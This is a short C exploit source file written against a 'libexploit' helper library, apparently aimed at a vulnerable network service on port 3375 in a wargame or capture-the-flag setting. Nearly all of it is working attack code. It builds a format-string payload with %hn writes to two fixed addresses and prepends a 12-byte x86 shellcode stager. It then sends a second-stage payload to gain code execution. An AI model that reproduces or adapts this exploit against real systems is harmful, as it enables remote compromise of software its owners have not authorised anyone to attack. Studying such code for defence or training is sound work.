#include <libexploit/libexploit.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int e_port = 3375;

int time_a(void)
{
    E_DATABUF_AUTO(db);
    struct {
        char buf[12];
        uint32_t addr[2];
        char str[40];
    } __attribute__((packed)) fmt;
    unsigned char stage0[] = {
        0x83, 0xC3, 0x0C, 0x53,
        0x6A, 0x04, 0x50, 0x6A,
        0x03, 0x58, 0xCD, 0x80
    };

    //getchar();

    erd_io_read(db, 19);
    //e_hexdump(db);

    memcpy(fmt.buf, stage0, sizeof(stage0));
    fmt.addr[0] = 0x0804F91E;
    fmt.addr[1] = 0x0804F91C;
    snprintf(fmt.str, sizeof(fmt.str), "%%%dx%%9$hn%%%dx%%10$hn\n",
            0x0804-0x14, 0x0804-0xBF20);
    //e_hexdump_buf(&fmt, strlen((char *)&fmt));
    erd_io_write_buf(&fmt, strlen((char *)&fmt));

    er_databuf_clear(db);
    erd_io_read(db, 48951);

    erd_io_write(e_payload);
    sleep(1);

    return 0;
}


int e_exploit(unsigned int brute)
{
    time_a();
}
